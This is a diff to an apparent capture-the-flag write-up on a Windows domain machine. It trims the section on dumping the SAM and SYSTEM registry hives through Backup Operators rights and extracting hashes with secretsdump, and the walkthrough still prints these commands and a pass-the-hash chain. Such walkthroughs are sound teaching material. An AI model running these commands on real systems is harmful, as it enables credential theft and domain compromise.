@@ -368,7 +368,7 @@ BloodHound confirms it: `emily.oscars` is a member of the **Backup Operators** b
 
 ### Dumping the SAM and SYSTEM Hives
 
-Save all three registry hives to disk from within the Evil-WinRM session. SAM holds local account hashes, SYSTEM contains the boot key needed to decrypt them, and SECURITY holds LSA secrets including cached domain credentials — you need all three for a complete dump:
+Save both registry hives to disk from within the Evil-WinRM session. SAM holds local account hashes; SYSTEM contains the boot key needed to decrypt them:
 
 ```bash
 *Evil-WinRM* PS C:\windows\temp> reg save HKLM\SAM C:\Windows\Temp\sam
@@ -376,17 +376,13 @@ The operation completed successfully.
 
 *Evil-WinRM* PS C:\windows\temp> reg save HKLM\SYSTEM C:\Windows\Temp\system
 The operation completed successfully.
-
-*Evil-WinRM* PS C:\windows\temp> reg save HKLM\SECURITY C:\Windows\Temp\security
-The operation completed successfully.
 ```
 
-Download all three files to your attacking machine using Evil-WinRM's built-in download function:
+Download both files to your attacking machine using Evil-WinRM's built-in download function:
 
 ```bash
 *Evil-WinRM* PS C:\windows\temp> download C:\Windows\Temp\sam
 *Evil-WinRM* PS C:\windows\temp> download C:\Windows\Temp\system
-*Evil-WinRM* PS C:\windows\temp> download C:\Windows\Temp\security
 ```
 
 ### Extracting Hashes with Secretsdump
@@ -394,7 +390,7 @@ Download all three files to your attacking machine using Evil-WinRM's built-in d
 Pass both files to `secretsdump.py` for offline hash extraction:
 
 ```bash
-secretsdump.py -sam sam -system system -security security LOCAL
+secretsdump.py -sam sam -system system LOCAL
 ```
 
 ```
@@ -440,5 +436,5 @@ Full domain compromise. The root flag is on the Administrator's desktop.
 | Lateral movement | Password stored in `david.orelious` AD description field | NetExec |
 | Credential discovery | `emily.oscars` password hardcoded in `Backup_script.ps1` | smbclient |
 | Shell + user flag | `emily.oscars` in Remote Management Users → WinRM shell → user.txt | Evil-WinRM |
-| Privilege escalation | Backup Operators → SeBackupPrivilege → reg save SAM/SYSTEM/SECURITY | reg, secretsdump |
+| Privilege escalation | Backup Operators → SeBackupPrivilege → reg save SAM/SYSTEM | reg, secretsdump |
 | Full compromise | Administrator NTLM hash → Pass-the-Hash | Evil-WinRM |
